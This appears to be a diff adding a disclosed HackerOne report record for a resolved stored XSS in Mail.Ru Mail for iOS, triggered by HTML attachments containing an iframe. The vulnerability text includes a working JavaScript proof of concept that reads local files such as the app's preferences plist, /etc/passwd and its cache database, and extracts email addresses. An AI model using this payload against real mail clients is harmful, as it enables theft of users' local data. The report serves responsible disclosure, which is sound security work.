@@ -1,0 +1,163 @@
+{
+  "id": 243058,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDMwNTg=",
+  "url": "https://hackerone.com/reports/243058",
+  "title": "XSS bypass Script execute,Read any file,execute any javascript code--UXSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-06-25T15:46:57.258Z",
+  "submitted_at": "2017-06-25T15:46:57.258Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "tea",
+    "url": "/tea",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/070/635/bc4c9d2f7b4fdc19d17e38e2e313ff5e44b8d56d_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 65,
+    "url": "https://hackerone.com/mailru",
+    "handle": "mailru",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Mail.ru",
+      "twitter_handle": "",
+      "website": "https://vk.company/",
+      "about": "Building the Internet since 1998"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-01-27T15:01:31.453Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-12-28T15:01:28.454Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Mail attachment  XSS bypass vulnerability--UXSS\n\nVulnerability impact：\nMail.Ru Mail for iOS\nMyMail for iOS\n\nexplain:\nMail app supports HTML attachments, however，Cannot execute javascript.\nfor example\n<script>alert(/xss/)</script>\n<img src=# onerror=alert(/xss/)>\nThese statements can not be executed in the html attachments...LOL\n\nHowever, the addition of a statement can execute the scriptjavascript.\nI did not understand it now\nIs this sentence：\n<iframe SRC=#></iframe>\nhas this, javascript can execute....\nThe other will not work，eg:\n<iframe src=1></iframe>\nor \n<iframe src=http://www.google.com></iframe>\n\nthe xss is file:// domain, so read any file.\nno same-origin policy,access to ant web origin and local files;\ntesting：\nWrite an email\nAdd an HTML attachment\nsend\n\nHTML attachment content:\n<iframe SRC=# ></iframe>\n<script>alert(/xss/)</script>\n\nHTML attachment can execute javascript.\n\nread file poc:\n\nfunction GetMailAddress(mailcontent){\n\tvar content_reg = new RegExp(\"\\\\w+\\@\\\\w+\\\\.\\\\w+\",'g');\n    alert(mailcontent.replace('/\\s/g','').replace('/\\S/g','').match(content_reg));\n}\n\t\nfunction read_file(read_file_path,tag){\n    var oReq = new XMLHttpRequest();\n    oReq.addEventListener(\"load\", function(){\n\t\tif (tag === true){\n\t\tGetMailAddress(this.responseText);\n\t\t} else {\n\t\t\talert(this.responseText);\n\t\t}\n\t\t}\n\t);\n    oReq.open(\"GET\", read_file_path);\n    oReq.send();\n}\n\n    var Lib_file_path = location.href.split('Library')[0] + 'Library';\n    var mail_plist_file = Lib_file_path + '/Preferences/ru.mail.mail.plist';\n\tvar passwd_file = 'file:///etc/passwd';\n    var cache_passwd = Lib_file_path + '/Caches/ru.mail.mail/Cache.db';\n\tread_file(mail_plist_file,true);\n\tread_file(passwd_file,false);\n\tread_file(cache_passwd,false);\n\n\n\nFor more information, please see the attachment of my report\n\n",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 197443,
+      "file_name": "mail.ru_ios_app_uxss.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/197/443/55d733b6f170b5d8f501fdf51870026fe7870761/mail.ru_ios_app_uxss.zip?response-content-disposition=attachment%3B%20filename%3D%22mail.ru_ios_app_uxss.zip%22%3B%20filename%2A%3DUTF-8%27%27mail.ru_ios_app_uxss.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYNWCPB7L%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T124441Z&X-Amz-Expires=2071&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZonlQ6XZgqcJy52%2BgLeu7rc%2BcmnwL48Jd3jP8q5%2FnAIgBqR93Cql4TkH3OcEpzuPURjNMviKVAaN%2BZ5EJ93CKHMqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDC6ruR9Bo4NPZ6hGziqOBTlv9ZKHmz6ju1OkdxDfdYMkEOLdYBFwxFeSW3uoBTkUPGqDZadsGRlOm%2FzVtXFfSNIYP7AeaBzFIeS8LcBh%2BgxgmY5hETW2LeYwB%2F3XW2H67p6e7bnzldnlj2tuACFxnKA6rcmcUQTXn4qVKPw%2FsgBonpbjVSLH1G3MhuwcdUrgeFjI7JHFzHMgd7%2BYjdjZMeFC5A7DM0sT8KjQAqMCvmyYUuytyZlFtZt%2BmkPDyj8xPC2BnGzGd8ViwG0oSBCmgyULo8%2BibDGvrMmOjHPDqqUa51uudsuIw3xXCU7yEl54SJO8XPwko%2FUDfNLlPnB%2BsrExqEFkzOUbRn8wytJZJbdlm4PKX7p1sguljWzLGzMthBAcUaMx563jGqM6UBzNW8J7ZvQGt%2B1a3uE51BbOuuys1pnhOCpDb5JVA%2F%2FnzxJBkW450qNxs7qEyti1abXcL80lTaRmG99RCoVXy4Z1np7gmDfekfXlXCBl86B94t2Ng9rjTnc7plMi%2BnjT5NpYRtvlD1UpwqSlpHw2LxzvZHpnEAjgW8aVgyKPoE6tQwMw2sgb02Lt0IOaTIVI9DmdZbb5FIIz5u0W7gGoxWgQ5yaRk5osuY5nK4GSs4uwAAb6e9hPfxePBU%2B3OK%2BLDM2L0ULVBqQLonfTFD4q0hygJNmtMZ93jUiC1uw5seAKU9RQaFXprCUTfTFtdiGuqhtRvHnqNI2%2BYtGwEaoPk45%2FBZHKWdUiA6zzx2Vh1ViwuP2bYU1TfleKuf4XSDTRnsL25sxpXHdWEdzp36j4m8m4N7y9V%2BDLGJL0W5laKN4XaBIRNCwRfNALochyxg%2FRqoYPvilO9klb%2Fo58doCSMcQFz%2B2dImB8vsUlC4TfkCpPPjC7payuBjqxAUz7jVGh5dF5HDYPCV1aK6vLNtHQn48iZT2lveCprzWjOASVNejwySv8S0Qz3%2BorxxSB4hGPZkqz36geF8d9lQ8aLh18bVe6qUL5yM5i2yxVkHovo80Uf9FwD0IrvwxhBv2vzB%2BEuch1dctBkoyLtJS470n%2BuD%2F%2BwCLVUXoH1ljlX3lPqEb2nvs0Eo4v6pGR4x8y4bHoxAxkfJRPNJ4ut4mAE9vidBtOStAITUN8HDLywA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=10530dba6c262d49db168641247e1bc67bbdf54c128c8618e1c36b4ec0c351fc",
+      "file_size": 1043,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-01-27T15:01:28.535Z",
+  "allow_singular_disclosure_after": -190762992.871433,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "irek",
+    "whitesector",
+    "eveeez",
+    "linkks",
+    "cr4xerbik4sh",
+    "japz",
+    "omespino",
+    "3apa3a",
+    "jaimin",
+    "forsaken_1337"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 238,
+    "asset_type": "APPLE_STORE_APP_ID",
+    "asset_identifier": "ru.mail.mail",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 6184,
+      "category": "team",
+      "content": "XSS can be executed in Mail.Ru Mail for iOS application via crafted attached HTML file with IFRAMEs, giving access to application's local files.",
+      "user": {
+        "id": 4836,
+        "username": "3apa3a",
+        "name": "Vladimir Dubrovin",
+        "bio": "En la agostada senda he visto al buen lagarto (gota de cocodrilo) meditando. ",
+        "cleared": false,
+        "verified": false,
+        "website": "https://3proxy.org/",
+        "location": "Nizhny Novgorod, Russia",
+        "created_at": "2014-04-10T22:08:47.745Z",
+        "url": "https://hackerone.com/3apa3a",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
